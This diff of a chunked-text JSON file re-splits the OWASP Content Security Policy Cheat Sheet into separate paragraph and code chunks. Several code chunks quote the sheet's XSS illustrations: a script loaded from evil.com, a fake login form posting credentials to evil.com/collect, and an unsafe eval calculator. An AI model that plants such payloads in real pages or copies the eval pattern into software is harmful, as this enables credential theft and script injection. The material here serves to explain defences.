@@ -123,9 +123,9 @@
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
       "chunk_idx": 8,
-      "chunk_type": "mixed",
-      "text_content": "By preventing the page from executing inline scripts, attacks like injecting\n\n```html\n<script>document.body.innerHTML='defaced'</script>\n```\n\nwill not work.",
-      "token_count": 39,
+      "chunk_type": "paragraph",
+      "text_content": "By preventing the page from executing inline scripts, attacks like injecting",
+      "token_count": 12,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -139,6 +139,38 @@
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
       "chunk_idx": 9,
+      "chunk_type": "code",
+      "text_content": "```html\n<script>document.body.innerHTML='defaced'</script>\n```",
+      "token_count": 23,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Context",
+        "Defense against XSS",
+        "1. Restricting Inline Scripts"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00010",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 10,
+      "chunk_type": "paragraph",
+      "text_content": "will not work.",
+      "token_count": 4,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Context",
+        "Defense against XSS",
+        "1. Restricting Inline Scripts"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00011",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 11,
       "chunk_type": "heading",
       "text_content": "#### 2. Restricting Remote Scripts",
       "token_count": 9,
@@ -151,13 +183,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00010",
+      "chunk_id": "ver_4d5e2f4d1c42_c00012",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 10,
-      "chunk_type": "mixed",
-      "text_content": "By preventing the page from loading scripts from arbitrary servers, attacks like injecting\n\n```html\n<script src=\"https://evil.com/hacked.js\"></script>\n```\n\nwill not work.",
-      "token_count": 47,
+      "chunk_idx": 12,
+      "chunk_type": "paragraph",
+      "text_content": "By preventing the page from loading scripts from arbitrary servers, attacks like injecting",
+      "token_count": 14,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -167,10 +199,42 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00011",
+      "chunk_id": "ver_4d5e2f4d1c42_c00013",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 11,
+      "chunk_idx": 13,
+      "chunk_type": "code",
+      "text_content": "```html\n<script src=\"https://evil.com/hacked.js\"></script>\n```",
+      "token_count": 29,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Context",
+        "Defense against XSS",
+        "2. Restricting Remote Scripts"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00014",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 14,
+      "chunk_type": "paragraph",
+      "text_content": "will not work.",
+      "token_count": 4,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Context",
+        "Defense against XSS",
+        "2. Restricting Remote Scripts"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00015",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 15,
       "chunk_type": "heading",
       "text_content": "#### 3. Restricting Unsafe JavaScript",
       "token_count": 9,
@@ -183,13 +247,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00012",
+      "chunk_id": "ver_4d5e2f4d1c42_c00016",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 12,
-      "chunk_type": "mixed",
-      "text_content": "By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:\n\n```js\n// A Simple Calculator\nvar op1 = getUrlParameter(\"op1\");\nvar op2 = getUrlParameter(\"op2\");\nvar sum = eval(`${op1} + ${op2}`);\nconsole.log(`The sum is: ${sum}`);\n```",
-      "token_count": 94,
+      "chunk_idx": 16,
+      "chunk_type": "paragraph",
+      "text_content": "By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:",
+      "token_count": 28,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -199,10 +263,26 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00013",
+      "chunk_id": "ver_4d5e2f4d1c42_c00017",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 13,
+      "chunk_idx": 17,
+      "chunk_type": "code",
+      "text_content": "```js\n// A Simple Calculator\nvar op1 = getUrlParameter(\"op1\");\nvar op2 = getUrlParameter(\"op2\");\nvar sum = eval(`${op1} + ${op2}`);\nconsole.log(`The sum is: ${sum}`);\n```",
+      "token_count": 66,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Context",
+        "Defense against XSS",
+        "3. Restricting Unsafe JavaScript"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00018",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 18,
       "chunk_type": "heading",
       "text_content": "#### 4. Restricting Form submissions",
       "token_count": 9,
@@ -215,13 +295,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00014",
+      "chunk_id": "ver_4d5e2f4d1c42_c00019",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 14,
-      "chunk_type": "mixed",
-      "text_content": "By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.\n\n```html\n<form method=\"POST\" action=\"https://evil.com/collect\">\n<h3>Session expired!\n\nPlease login again.</h3>\n<label>Username</label>\n<input type=\"text\" name=\"username\"/>\n\n<label>Password</label>\n<input type=\"password\" name=\"pass\"/>\n\n<input type=\"Submit\" value=\"Login\"/>\n</form>\n```",
-      "token_count": 126,
+      "chunk_idx": 19,
+      "chunk_type": "paragraph",
+      "text_content": "By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.",
+      "token_count": 22,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -231,10 +311,26 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00015",
+      "chunk_id": "ver_4d5e2f4d1c42_c00020",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 15,
+      "chunk_idx": 20,
+      "chunk_type": "code",
+      "text_content": "```html\n<form method=\"POST\" action=\"https://evil.com/collect\">\n<h3>Session expired! Please login again.</h3>\n<label>Username</label>\n<input type=\"text\" name=\"username\"/>\n\n<label>Password</label>\n<input type=\"password\" name=\"pass\"/>\n\n<input type=\"Submit\" value=\"Login\"/>\n</form>\n```",
+      "token_count": 104,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Context",
+        "Defense against XSS",
+        "4. Restricting Form submissions"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00021",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 21,
       "chunk_type": "heading",
       "text_content": "#### 5. Restricting Objects",
       "token_count": 8,
@@ -247,10 +343,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00016",
+      "chunk_id": "ver_4d5e2f4d1c42_c00022",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 16,
+      "chunk_idx": 22,
       "chunk_type": "paragraph",
       "text_content": "And by restricting the HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.",
       "token_count": 59,
@@ -263,10 +359,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00017",
+      "chunk_id": "ver_4d5e2f4d1c42_c00023",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 17,
+      "chunk_idx": 23,
       "chunk_type": "heading",
       "text_content": "### Defense against framing attacks",
       "token_count": 7,
@@ -278,10 +374,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00018",
+      "chunk_id": "ver_4d5e2f4d1c42_c00024",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 18,
+      "chunk_idx": 24,
       "chunk_type": "paragraph",
       "text_content": "Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.\n\nHistorically the `X-Frame-Options` header has been used for this, but it has been obsoleted by the `frame-ancestors` CSP directive.",
       "token_count": 61,
@@ -293,10 +389,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00019",
+      "chunk_id": "ver_4d5e2f4d1c42_c00025",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 19,
+      "chunk_idx": 25,
       "chunk_type": "heading",
       "text_content": "### Defense in Depth",
       "token_count": 6,
@@ -308,10 +404,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00020",
+      "chunk_id": "ver_4d5e2f4d1c42_c00026",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 20,
+      "chunk_idx": 26,
       "chunk_type": "paragraph",
       "text_content": "A strong CSP provides an effective __second layer__ of protection against various types of vulnerabilities, especially XSS.\n\nAlthough CSP doesn't prevent web applications from *containing* vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.\n\nEven on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity).\n\nThis can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.\n\nWith all that being said, CSP __should not__ be relied upon as the only defensive mechanism against XSS.\n\nYou must still follow good development practices such as the ones described in [Cross-Site Scripting Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), and then deploy CSP on top of that as a bonus security layer.",
       "token_count": 197,
@@ -323,10 +419,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00021",
+      "chunk_id": "ver_4d5e2f4d1c42_c00027",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 21,
+      "chunk_idx": 27,
       "chunk_type": "heading",
       "text_content": "## Policy Delivery",
       "token_count": 4,
@@ -337,10 +433,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00022",
+      "chunk_id": "ver_4d5e2f4d1c42_c00028",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 22,
+      "chunk_idx": 28,
       "chunk_type": "paragraph",
       "text_content": "You can deliver a Content Security Policy to your website in three ways.",
       "token_count": 14,
@@ -351,10 +447,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00023",
+      "chunk_id": "ver_4d5e2f4d1c42_c00029",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 23,
+      "chunk_idx": 29,
       "chunk_type": "heading",
       "text_content": "### 1. Content-Security-Policy Header",
       "token_count": 11,
@@ -366,13 +462,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00024",
+      "chunk_id": "ver_4d5e2f4d1c42_c00030",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 24,
-      "chunk_type": "mixed",
-      "text_content": "Send a Content-Security-Policy HTTP response header from your web server.\n\n```text\nContent-Security-Policy: ...\n\n```\n\nUsing a header is the preferred way and supports the full CSP feature set.\n\nSend it in all HTTP responses, not just the index page.\n\nThis is a W3C Spec standard header.\n\nSupported by Firefox 23+, Chrome 25+ and Opera 19+",
-      "token_count": 80,
+      "chunk_idx": 30,
+      "chunk_type": "paragraph",
+      "text_content": "Send a Content-Security-Policy HTTP response header from your web server.",
+      "token_count": 15,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -381,10 +477,40 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00025",
+      "chunk_id": "ver_4d5e2f4d1c42_c00031",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 25,
+      "chunk_idx": 31,
+      "chunk_type": "code",
+      "text_content": "```text\nContent-Security-Policy: ...\n```",
+      "token_count": 16,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Policy Delivery",
+        "1. Content-Security-Policy Header"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00032",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 32,
+      "chunk_type": "paragraph",
+      "text_content": "Using a header is the preferred way and supports the full CSP feature set.\n\nSend it in all HTTP responses, not just the index page.\n\nThis is a W3C Spec standard header.\n\nSupported by Firefox 23+, Chrome 25+ and Opera 19+",
+      "token_count": 49,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Policy Delivery",
+        "1. Content-Security-Policy Header"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00033",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 33,
       "chunk_type": "heading",
       "text_content": "### 2. Content-Security-Policy-Report-Only Header",
       "token_count": 15,
@@ -396,13 +522,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
+      "chunk_id": "ver_4d5e2f4d1c42_c00034",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 26,
-      "chunk_type": "mixed",
-      "text_content": "Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.\n\n```text\nContent-Security-Policy-Report-Only: ...\n\n```\n\nStill, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.\n\nThis is also a W3C Spec standard header.\n\nSupported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking (\"fail open\") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive.\n\nThis is often used as a precursor to utilizing CSP in blocking mode (\"fail closed\")\n\nBrowsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues.\n\nThis pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).",
-      "token_count": 236,
+      "chunk_idx": 34,
+      "chunk_type": "paragraph",
+      "text_content": "Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.",
+      "token_count": 26,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -411,10 +537,40 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00027",
+      "chunk_id": "ver_4d5e2f4d1c42_c00035",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 27,
+      "chunk_idx": 35,
+      "chunk_type": "code",
+      "text_content": "```text\nContent-Security-Policy-Report-Only: ...\n```",
+      "token_count": 20,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Policy Delivery",
+        "2. Content-Security-Policy-Report-Only Header"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00036",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 36,
+      "chunk_type": "paragraph",
+      "text_content": "Still, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.\n\nThis is also a W3C Spec standard header.\n\nSupported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking (\"fail open\") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive.\n\nThis is often used as a precursor to utilizing CSP in blocking mode (\"fail closed\")\n\nBrowsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues.\n\nThis pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).",
+      "token_count": 190,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Policy Delivery",
+        "2. Content-Security-Policy-Report-Only Header"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00037",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 37,
       "chunk_type": "heading",
       "text_content": "### 3. Content-Security-Policy Meta Tag",
       "token_count": 12,
@@ -426,13 +582,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00028",
+      "chunk_id": "ver_4d5e2f4d1c42_c00038",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 28,
-      "chunk_type": "mixed",
-      "text_content": "Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.\n\nIn this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:\n\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"...\">\n```\n\nAlmost everything is still supported, including full XSS defenses.\n\nHowever, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).",
-      "token_count": 226,
+      "chunk_idx": 38,
+      "chunk_type": "paragraph",
+      "text_content": "Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.\n\nIn this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:",
+      "token_count": 63,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -441,10 +597,40 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00029",
+      "chunk_id": "ver_4d5e2f4d1c42_c00039",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 29,
+      "chunk_idx": 39,
+      "chunk_type": "code",
+      "text_content": "```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"...\">\n```",
+      "token_count": 28,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Policy Delivery",
+        "3. Content-Security-Policy Meta Tag"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00040",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 40,
+      "chunk_type": "paragraph",
+      "text_content": "Almost everything is still supported, including full XSS defenses.\n\nHowever, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).",
+      "token_count": 135,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Policy Delivery",
+        "3. Content-Security-Policy Meta Tag"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00041",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 41,
       "chunk_type": "heading",
       "text_content": "### WARNING",
       "token_count": 4,
@@ -456,10 +642,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00030",
+      "chunk_id": "ver_4d5e2f4d1c42_c00042",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 30,
+      "chunk_idx": 42,
       "chunk_type": "paragraph",
       "text_content": "__DO NOT__ use `X-Content-Security-Policy` or `X-WebKit-CSP`.\n\nTheir implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.",
       "token_count": 42,
@@ -471,10 +657,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00031",
+      "chunk_id": "ver_4d5e2f4d1c42_c00043",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 31,
+      "chunk_idx": 43,
       "chunk_type": "heading",
       "text_content": "## CSP Types (granular/allowlist based or strict)",
       "token_count": 12,
@@ -485,10 +671,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00032",
+      "chunk_id": "ver_4d5e2f4d1c42_c00044",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 32,
+      "chunk_idx": 44,
       "chunk_type": "paragraph",
       "text_content": "For original research on allowlist weaknesses, see [CSP Is Dead, Long Live CSP!](https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/).\n\nThe original mechanism for building a CSP involved creating allow-lists which would define the content and sources that were permitted in the context of the HTML page.\n\nHowever, current leading practice is to create a \"Strict\" CSP which is much easier to deploy and more secure as it is less likely to be bypassed.",
       "token_count": 128,
@@ -499,10 +685,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00033",
+      "chunk_id": "ver_4d5e2f4d1c42_c00045",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 33,
+      "chunk_idx": 45,
       "chunk_type": "heading",
       "text_content": "## Strict CSP",
       "token_count": 4,
@@ -513,10 +699,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00034",
+      "chunk_id": "ver_4d5e2f4d1c42_c00046",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 34,
+      "chunk_idx": 46,
       "chunk_type": "mixed",
       "text_content": "A strict CSP can be created by using a limited number of the granular [Fetch Directives listed below](#fetch-directives) along with one of two mechanisms:\n\n- Nonce based\n- Hash based\n\nThe `strict-dynamic` directive can optionally also be used to make it easier to implement a Strict CSP.\n\nThe following sections will provide some basic guidance to these mechanisms but it is strongly recommended to follow Google's detailed and methodological instructions for creating a Strict CSP:\n\n__[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)__",
       "token_count": 127,
@@ -527,10 +713,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00035",
+      "chunk_id": "ver_4d5e2f4d1c42_c00047",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 35,
+      "chunk_idx": 47,
       "chunk_type": "heading",
       "text_content": "### Nonce based",
       "token_count": 5,
@@ -542,13 +728,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00036",
+      "chunk_id": "ver_4d5e2f4d1c42_c00048",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 36,
-      "chunk_type": "mixed",
-      "text_content": "Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:\n\n```js\nconst nonce = uuid.v4();\nscriptSrc += ` 'nonce-${nonce}'`;\n```\n\nYou would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:\n\n```html\n<script nonce=\"<%= nonce %>\">\n    ...\n\n</script>\n```",
-      "token_count": 118,
+      "chunk_idx": 48,
+      "chunk_type": "paragraph",
+      "text_content": "Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:",
+      "token_count": 32,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "Content Security Policy Cheat Sheet",
@@ -557,10 +743,55 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00037",
+      "chunk_id": "ver_4d5e2f4d1c42_c00049",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 37,
+      "chunk_idx": 49,
+      "chunk_type": "code",
+      "text_content": "```js\nconst nonce = uuid.v4();\nscriptSrc += ` 'nonce-${nonce}'`;\n```",
+      "token_count": 30,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Strict CSP",
+        "Nonce based"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00050",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 50,
+      "chunk_type": "paragraph",
+      "text_content": "You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:",
+      "token_count": 29,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Strict CSP",
+        "Nonce based"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00051",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 51,
+      "chunk_type": "code",
+      "text_content": "```html\n<script nonce=\"<%= nonce %>\">\n    ...\n</script>\n```",
+      "token_count": 27,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "Strict CSP",
+        "Nonce based"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00052",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 52,
       "chunk_type": "heading",
       "text_content": "#### Warning",
       "token_count": 5,
@@ -573,10 +804,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00038",
+      "chunk_id": "ver_4d5e2f4d1c42_c00053",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 38,
+      "chunk_idx": 53,
       "chunk_type": "paragraph",
       "text_content": "__Don't__ create a middleware that replaces all script tags with \"script nonce=...\" because attacker-injected scripts will then get the nonces as well.\n\nYou need an actual HTML templating engine to use nonces.",
       "token_count": 44,
@@ -589,10 +820,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00039",
+      "chunk_id": "ver_4d5e2f4d1c42_c00054",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 39,
+      "chunk_idx": 54,
       "chunk_type": "heading",
       "text_content": "### Hashes",
       "token_count": 4,
@@ -604,13 +835,13 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00040",
+      "chunk_id": "ver_4d5e2f4d1c42_c00055",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 40,
-      "chunk_type": "mixed",
